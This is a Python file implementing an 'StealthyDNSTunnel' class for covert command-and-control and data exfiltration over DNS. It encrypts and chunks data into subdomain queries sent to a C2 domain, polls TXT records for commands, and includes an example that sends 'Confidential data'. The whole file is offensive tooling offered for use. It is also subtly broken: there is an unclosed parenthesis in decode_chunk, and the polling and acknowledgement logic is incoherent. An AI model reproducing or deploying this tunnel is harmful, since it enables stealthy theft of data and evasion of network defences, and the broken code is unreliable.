import dns.resolver
import dns.name
import dns.message
import dns.query
import base64
import zlib
import hashlib
import random
import time
import threading
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

class StealthyDNSTunnel:
    def __init__(self, c2_domain, encryption_key, mode="exfil"):
        self.c2_domain = c2_domain
        self.encryption_key = encryption_key[:32]  # AES-256 requires 32-byte key
        self.iv = b'\x00'*16  # Static IV for simplicity
        self.mode = mode
        self.chunk_size = 30  # Max 63 bytes per label, but we use 30 for safety
        self.resolver = dns.resolver.Resolver(configure=False)
        self.resolver.nameservers = ["8.8.8.8", "1.1.1.1"]  # Public resolvers
        self.session_id = random.randint(0, 0xFFFF)
        self.sequence = 0
        self.ack_event = threading.Event()
        self.ack_buffer = {}
        self.listening = False
        self.response_handler = None
        
    def encrypt(self, data):
        # Compress first
        compressed = zlib.compress(data)
        
        # Pad data
        padder = padding.PKCS7(128).padder()
        padded = padder.update(compressed) + padder.finalize()
        
        # Encrypt
        cipher = Cipher(
            algorithms.AES(self.encryption_key),
            modes.CBC(self.iv),
            backend=default_backend()
        )
        encryptor = cipher.encryptor()
        return encryptor.update(padded) + encryptor.finalize()
    
    def decrypt(self, data):
        # Decrypt
        cipher = Cipher(
            algorithms.AES(self.encryption_key),
            modes.CBC(self.iv),
            backend=default_backend()
        )
        decryptor = cipher.decryptor()
        decrypted = decryptor.update(data) + decryptor.finalize()
        
        # Unpad
        unpadder = padding.PKCS7(128).unpadder()
        unpadded = unpadder.update(decrypted) + unpadder.finalize()
        
        # Decompress
        return zlib.decompress(unpadded)
    
    def encode_chunk(self, data):
        # Base32 is more DNS-friendly than Base64
        return base64.b32encode(data).decode().rstrip("=").lower()
    
    def decode_chunk(self, text):
        # Add padding back if needed
        text = text.upper()
        padding_needed = (8 - len(text) % 8
        text += "=" * padding_needed
        return base64.b32decode(text)
    
    def send_dns_query(self, query_type, payload):
        domain = payload + "." + self.c2_domain
        try:
            if query_type == "A":
                answers = self.resolver.resolve(domain, "A")
            elif query_type == "TXT":
                answers = self.resolver.resolve(domain, "TXT")
                return [str(r) for r in answers]
            return [str(r) for r in answers]
        except:
            return []
    
    def send_data(self, data):
        encrypted = self.encrypt(data)
        encoded = self.encode_chunk(encrypted)
        
        # Split into chunks
        chunks = [encoded[i:i+self.chunk_size] for i in range(0, len(encoded), self.chunk_size)]
        total_chunks = len(chunks)
        
        # Send initialization packet
        init_payload = f"init.{self.session_id:04x}.{total_chunks:02x}"
        self.send_dns_query("A", init_payload)
        
        # Wait for ACK
        if not self.ack_event.wait(5):
            return False
        
        # Send data chunks
        for i, chunk in enumerate(chunks):
            payload = f"data.{self.session_id:04x}.{i:02x}.{chunk}"
            self.send_dns_query("A", payload)
            time.sleep(0.1)  # Avoid flooding
            
        # Send termination
        term_payload = f"term.{self.session_id:04x}.{hashlib.sha256(data).hexdigest()[:8]}"
        self.send_dns_query("A", term_payload)
        
        return True
    
    def receive_data(self):
        while self.listening:
            # Listen for TXT records which can carry larger responses
            responses = self.send_dns_query("TXT", f"poll.{self.session_id:04x}")
            if responses:
                # Join multi-string TXT records
                full_response = "".join(responses)
                try:
                    decoded = self.decode_chunk(full_response)
                    decrypted = self.decrypt(decoded)
                    return decrypted
                except:
                    pass
            time.sleep(5)
    
    def handle_incoming(self, domain):
        parts = domain.split('.')
        if len(parts) < 4 or parts[-1] != self.c2_domain.split('.')[0]:
            return None
        
        command = parts[0]
        if command == "init":
            session_id = int(parts[1], 16)
            total_chunks = int(parts[2], 16)
            self.ack_buffer[session_id] = {
                'total': total_chunks,
                'received': 0,
                'chunks': [None] * total_chunks,
                'timestamp': time.time()
            }
            # Send ACK
            ack_payload = f"ack.{session_id:04x}"
            self.send_dns_query("A", ack_payload)
            
        elif command == "data":
            session_id = int(parts[1], 16)
            chunk_num = int(parts[2], 16)
            chunk_data = ".".join(parts[3:])
            
            if session_id in self.ack_buffer:
                self.ack_buffer[session_id]['chunks'][chunk_num] = chunk_data
                self.ack_buffer[session_id]['received'] += 1
                
        elif command == "term":
            session_id = int(parts[1], 16)
            checksum = parts[2]
            
            if session_id in self.ack_buffer:
                buf = self.ack_buffer[session_id]
                if buf['received'] == buf['total']:
                    # Reassemble
                    full_encoded = "".join(buf['chunks'])
                    try:
                        decoded = self.decode_chunk(full_encoded)
                        decrypted = self.decrypt(decoded)
                        # Verify checksum
                        if hashlib.sha256(decrypted).hexdigest()[:8] == checksum:
                            del self.ack_buffer[session_id]
                            return decrypted
                    except:
                        pass
            del self.ack_buffer[session_id]
            
        return None
    
    def start_listener(self, callback):
        self.listening = True
        self.response_handler = callback
        
        def listener_thread():
            while self.listening:
                # Use a random subdomain to poll for commands
                poll_domain = f"{random.randint(0,0xFFFF):04x}.cmd.{self.c2_domain}"
                try:
                    answers = self.resolver.resolve(poll_domain, "TXT")
                    response = "".join([str(r) for r in answers])
                    command = self.handle_incoming(poll_domain)
                    if command:
                        if self.response_handler:
                            response = self.response_handler(command)
                            if response:
                                self.send_data(response)
                except:
                    pass
                time.sleep(10)
        
        threading.Thread(target=listener_thread, daemon=True).start()
    
    def stop_listener(self):
        self.listening = False

# Example usage:
if __name__ == "__main__":
    KEY = hashlib.sha256(b"secret_key").digest()
    tunnel = StealthyDNSTunnel("example.com", KEY)
    
    def command_handler(cmd):
        print(f"Received command: {cmd.decode()}")
        return b"Command executed successfully"
    
    tunnel.start_listener(command_handler)
    
    # Send sample data
    data = b"Confidential data " * 100
    tunnel.send_data(data)
    
    # Keep running
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        tunnel.stop_listener()